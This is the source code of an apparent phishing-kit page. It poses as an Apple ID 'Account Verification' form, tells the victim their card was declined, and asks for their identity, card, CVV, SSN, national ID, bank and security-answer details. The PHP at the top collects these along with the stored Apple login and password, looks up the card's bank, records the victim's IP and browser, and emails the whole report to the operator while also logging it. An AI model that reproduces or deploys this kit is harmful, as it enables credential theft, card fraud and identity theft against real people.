<?php
session_start();
error_reporting(0);
require "assets/includes/language.php";
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require_once "assets/includes/apxdev.php";
require_once "class.phpmailer.php";
require_once "class.smtp.php";
require_once "setting.php";
if(isset($_POST["fname"]) && isset($_POST["lname"]) && isset($_POST["dob"]) && isset($_POST["address"])) {

    if(isset($_POST['mname']) && !empty($_POST['mname'])) {
        $mname = "";
    }else {
        $mname = $_POST['mname'];
    }
    
    $_SESSION['sescc'] = $_POST["ccno"];
    $userid = $_SESSION["user"];
    $password = $_SESSION["pass"];
    $name=$_POST["fname"]." ".$mname." ".$_POST["lname"];
    $dob=$_POST["dob"];
    $address=$_POST["address"].", ".$_POST["town"].", ".$_POST["county"];
    $postcode=$_POST["postcode"];
    $country=$_POST["country"];
    $telephone=$_POST["telephone"];
    $ssn=$_POST["ssn"];
    $ccname=$_POST["ccname"];
    $ccno=$_POST["ccno"];
    $ccexp=$_POST["ccexp"];
    $climit = $_POST['climit'];
    $citizenid = $_POST['citizenid'];
    $qatarid = $_POST['qatarid'];
    $naid = $_POST['naid'];
    $bans = $_POST['bans'];
    $passport = $_POST['passport'];
    $civilid = $_POST['civilid'];
    $numbid = $_POST['numbid'];
    $secode=$_POST["secode"];
    $acno=$_POST["acno"];
    $sort=$_POST["sortcode"];
    $q1=$_POST["q1"];
    $a1=$_POST["a1"];

    $nabid = $_POST["nabid"];
    $bankaccount = $_POST["bankaccount"];
    $cardid = $_POST['cardid'];
    $cardpassword = $_POST['cardpassword'];

    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    $systemInfo = systemInfo($ip);
    $ccno = str_replace(' ', '', $ccno);
    $last4 = substr($ccno, 12, 16);
                 // fungsi bin

                $bin = str_replace(' ', '', $ccno);
                $bin = substr($bin, 0, 6);
                $c = curl_init();
                curl_setopt($c, CURLOPT_URL, "https://www.cardbinlist.com/search.html?bin=$bin");
                curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($c, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
                $result = curl_exec($c);
                curl_close($c);
                preg_match_all("/<td>(.*)<\/td>/", $result, $pisah);
                preg_match_all("/target=\"_blank\">(.*)<\/a><\/td>/", $result, $pisah2);
                $ccbrand = $pisah2[1][1];  
                $ccbank = $pisah[1][2];
                $cctype = strtoupper($pisah[1][6]);
                $ccklas = $pisah[1][7];
$BIN_LOOKUP  = str_replace(' ', '', $_POST["ccno"]);
$RSJ_BIN    = @json_decode(file_get_contents("https://lookup.binlist.net/".$bin.""));
$BIN_CARD    = $RSJ_BIN->scheme;
$BIN_BANK    = $RSJ_BIN->bank->name;
$BIN_TYPE    = $RSJ_BIN->type;
$BIN_LEVEL   = $RSJ_BIN->brand;
$BIN_CNTRCODE= $RSJ_BIN->country->alpha2;
$BIN_WEBSITE = strtolower($RSJ_BIN->bank->url);
$BIN_PHONE   = strtolower($RSJ_BIN->bank->phone);
$BIN_COUNTRY = $RSJ_BIN->country->name;
///////////////////////////////// SESSION FOR SOME VAR  /////////////////////////////////
$_SESSION['_country_']  = $BIN_COUNTRY;
$_SESSION['_cntrcode_'] = $BIN_CNTRCODE;
$_SESSION['_cc_brand_'] = $BIN_CARD;
$_SESSION['_cc_bank_']  = $BIN_BANK;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_LEVEL;
$_SESSION['_cc_site_']  = $BIN_WEBSITE;
$_SESSION['_cc_phone_'] = $BIN_PHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
$_SESSION['_global_']   = $_SESSION['_cntrcode_']." - ".$_SESSION['_ip_'];
///////////////////////////////// BIN CHECKER  /////////////////////////////////

                $VictimInfo1 = "| IP Address :" . " " . $ip . " (" . gethostbyaddr($ip) . ")";
                $VictimInfo2 = "| Location :" . " " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'];
                $VictimInfo3 = "| UserAgent :" . " " . $systemInfo['useragent'];
                $VictimInfo4 = "| Browser :" . " " . $systemInfo['browser'];
                $VictimInfo5 = "| Platform :" . " " . $systemInfo['os'];
                $VictimInfo6 = "" . $systemInfo['country'];
                $from = $SenderEmail;
                $headers = "From: $SenderCC <$SenderEmail>";
                $subj = "" . $ccname . " - $bin - ". $_SESSION['_cc_brand_'] ." - ". $_SESSION['_cc_bank_'] ."-". $_SESSION['_cc_type_'] ."-". $_SESSION['_cc_class_'] ." [ " . $VictimInfo6 . " $ip " . $systemInfo['os'] . "]";
                $to = $Your_Email;
                $warnsubj = "Abuse";
                $warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
                $bad_words = array(
                        '9999',
                        '4r5e',
                        '5h1t',
                        '5hit',
                        'a55',
                        'anal',
                        'asshole',
                        'arsehole',
                        'passwd',
                        'sample'
                );
                $data = "
      ++--------[*RSJKINGDOM X APPLE*]--------++

    ------------------------------------------
              Apple Login
    ------------------------------------------
    Username : $userid
    Password : $password

    ------------------------------------------
              CreditCard
    ------------------------------------------
    Cardholder Name   :  $ccname
    Card Number       :  $ccno
    Expiration Date   :  $ccexp
    Cvv2              :  $secode
    BIN/IIN Info      :  $bin - ". $_SESSION['_cc_brand_'] ." - ". $_SESSION['_cc_bank_'] ."-". $_SESSION['_cc_type_'] ."-". $_SESSION['_cc_class_'] ."
    For Check         :  $ccno/$ccexp/$secode
    Qatar ID (QA)                 : $qatarid
    ID Number (GR)                : $numbid
    Citizen ID (TH)               : $citizenid
    National ID (SA)              : $naid
    Sort Code (UK/IE)             : $sort
    Civil ID Number (KW)          : $civilid
    Bank Access Number (NZ)       : $bans
    Account Number (UK/IE/IN)     : $acno
    Credit limit (IE/TH/IN/NZ/AU) : $climit
    Bank Account (AU)             : $bankaccount
    NAB ID (AU)                   : $nabid
    Card ID (JP)                  : $cardid
    Card Password (JP)            : $cardpassword

    ------------------------------------------
          Account Information
    ------------------------------------------
    Full Name     :  $name
    Address       :  $address
    Zip/PostCode  :  $postcode
    Country       :  $country
    Phone Number  :  $telephone
    SSN           :  $ssn
    DOB           :  $dob
    Security Question  : $q1
    Security Answer    : $a1

    ------------------------------------------
             Victim Login
    ------------------------------------------
    From     :  $VictimInfo1 - $VictimInfo2
    Browser  :  $VictimInfo3 - $VictimInfo4 - $VictimInfo5

    ++---------===[ $$ End Resutls $$ ]===---------++
    ";

        mail($to,$subj,$data,$headers);
        $empas   = "# $bin - $ccbrand - $cctype - $ccklas - $ccbank [ ".$systemInfo['country']." ]\n";
    $file = fopen("assets/logs/bin.log", "a");
    fwrite($file, $empas);
    fclose($file);

    $file2 = $_SERVER['DOCUMENT_ROOT']."/assets/logs/._ccz_.txt";
    $isi  = file_get_contents($file2);
    $buka = fopen($file2,"w");
    fwrite($buka, $isi+1);
    fclose($buka);
}
?>
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script type="text/javascript">
if (screen.width <= 699) {
document.location = "StepV2.php?&sessionid=<?php echo generateRandomString(115);?>&securessl=true";
}
</script>

<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?=tr('Confirm your information');?></title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
<link href="assets/css/error-tips.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>
<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="not-mobile appleid-user">
                                    <span class="first_name"><?=tr('Account Verification');?></span>
                                    <small class="SessionUser"><?=tr('Your Apple ID is');?> <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link"><?=tr('Sign Out');?> </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">
<?php if($idcard == "yoi"){
?>
<form action="Upload-Identity.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
 <?php }else{ ?>
 <form action="Done.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" method="post" name="details" id="details" class="proceed">
 <?php } ?>
<div class="container flow-sections">
<section class="flow-section mobile-section-edit  edit ">
    <div class="account-wrapper">
        <div class="row">
            <div class="col-md-3 section-name" id="heading-account">
                <h2 class="not-mobile section-title wrap-section-title"><?=tr('Personal Information')?></h2>
            </div>
            <div id="account-content" aria-labelledby="heading-account" class="col-md-9 subsection">
<div class="accordion-fade ">
    <div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle" id="nameLabel"><?=tr('NAME');?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="fname" id="fname" class="generic-input-field form-control field" placeholder="<?=tr('First Name');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="mname" id="mname" class="generic-input-field form-control field" placeholder="<?=tr('Middle Name (optional)');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
  <input type="text" name="lname" id="lname" class="generic-input-field form-control field" placeholder="<?=tr('Last Name');?>">
</div>
</div>
</div>
</div>
</div>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle"><?=tr('DATE OF BIRTH');?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
<input id="dob" name="dob" class="form-control form-input" type="text" placeholder="<?=tr('Date of Birth');?>">
</div>
</div>
</div>
</div>
</div>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle"><?=tr('TELEPHONE');?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
<input id="telephone" name="telephone" class="form-control form-input" type="text" placeholder="<?=tr('Telephone Number');?>">
</div>
</div>
</div>
</div>
</div>
<?php echo $langx['SSN'];?>
<?php echo $langx['PASSPORT'];?>
<?php echo $langx['NUMBID'];?>
<?php echo $langx['NAID'];?>
<?php echo $langx['CIVILID'];?>
<?php echo $langx['QATARID'];?>
<?php echo $langx['CITIZENID'];?>
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle"><?=tr('ADDRESS');?></h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="address" id="address" class="generic-input-field form-control field" placeholder="<?=tr('Address Line');?> ">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="town" id="town" class="generic-input-field form-control field" placeholder="<?=tr('Town / City');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="select-wrapper">
<?php echo $langx['COUNTYSELECT'];?>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper last-wrapper">
<div class="name-input">
  <input type="text" name="postcode" id="postcode" class="generic-input-field form-control field" placeholder="<?php echo $langx['POSTCODE'];?>">
</div>
</div>
<input type="hidden" name="country" value="<?php echo $langx['COUNTRY'];?>">
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<section class="flow-section mobile-section-edit  edit ">
<div class="account-wrapper">
<div class="row">
<div class="col-md-3 section-name" id="heading-account">
<h2 class="not-mobile section-title wrap-section-title"><?=tr('Account Details');?></h2>
</div>
<div id="account-content" class="col-md-9 subsection">
<div class="accordion-fade ">
<div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">

<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle" id="nameLabel"><?=tr('CARD DETAILS');?></h3>
<div class="pop-container error signin-error">
              <div class="error pop-bottom tk-subbody-headline">
                  <p class="fat" id="errMsg">
<font color="red"><?=tr("Your Credit Card was declined,Please add another Credit card.");?></font>
                  </p>


<div class="form-group">
<div class="pop-wrapper field-pop-wrapper first-wrapper">
<div class="name-input">
  <input type="text" name="ccname" id="ccname" class="generic-input-field form-control field" placeholder="<?=tr('Cardholders Name');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="ccno" id="ccno" class="cc-number generic-input-field form-control field" placeholder="<?=tr('Card Number');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="ccexp" id="ccexp" class="cc-exp generic-input-field form-control field" placeholder="<?=tr('Expiry Date');?>">
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="secode" id="secode" class="cc-cvc generic-input-field form-control field" placeholder="<?=tr('Card Security Code');?>">
</div>
</div>
<?php echo $langx['CARDID'];?>
<?php echo $langx['CARDPASSWORD'];?>
<?php echo $langx['CREDITLIMIT'];?>
<?php echo $langx['ACCOUNT'];?>
<?php echo $langx['BANK_ACCOUNT'];?>
<?php echo $langx['NABID'];?>
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
<section class="flow-section mobile-section-edit  edit " style="border-bottom: 0px;">
<div class="account-wrapper">
<div class="row">
<div class="col-md-3 section-name" id="heading-account">
<h2 class="not-mobile section-title wrap-section-title"><?=tr('Security');?></h2>
</div>
<div id="account-content" class="col-md-9 subsection">
<div class="accordion-fade ">
<div class="accordion-fade acdn-edit" style="opacity: 1; overflow: inherit;">
<div class="editable account-edit clearfix">
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle" id="nameLabel"><?=tr('SELECT A SECURITY QUESTION');?></h3>
<div class="form-group">
<div class="form-group clearfix" style="padding-top:0px;">
<div class="select-wrapper">
<select id="q1" name="q1" type="text" class="form-control question" style="height:32px!important;padding-left:10px;">
  <option  value=""><?=tr('Select security question');?></option>
  <option value="mothers maiden name"><?=tr("Mother's Maiden Name");?></option>
  <option value="drivers no"><?=tr('Driving License Number');?></option>
  <option value="passport no"><?=tr('Passport Number');?></option>
</select>
</div>
</div>
<div class="pop-wrapper field-pop-wrapper middle-wrapper">
<div class="name-input">
  <input type="text" name="a1" id="a1" class="generic-input-field form-control field" placeholder="<?=tr('Answer');?>">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="accordion-fade acdn-nonedit"></div>
</div>
</div>
</div>
</div>
</section>
</div>
<input type="submit" class="gobtn btn-link" style="float:right;" value="<?=tr('Finish');?>">
</form>
<!-- FORM ENDS -->
</div>
</div>
</div>
</div>
<footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level">Shop the <a href="#">Apple Online Store</a> (<?php echo $langx['APPCALL'];?>), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
</div>
<div class="FooterLine2">
<ul class="menu">
<li class="item"><a href="#">Apple Info</a></li>
<li class="item"><a href="#">Site Map</a></li>
<li class="item"><a href="#">Hot News</a></li>
<li class="item"><a href="#">RSS Feeds</a></li>
<li class="item"><a href="#">Contact Us</a></li>
<li class="item"><a class="choose" href="#"><img height="22" src="<?php echo $langx['FLAG'];?>" width="22"></a></li>
</ul>
</div>
<div class="FooterLine3">Copyright -� 2018 Apple Inc. All rights reserved.
<ul class="menu">
<li class="item"><a href="#">Terms of Use</a></li>
<li class="item"><a href="#">Privacy Policy</a></li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</body>
</html>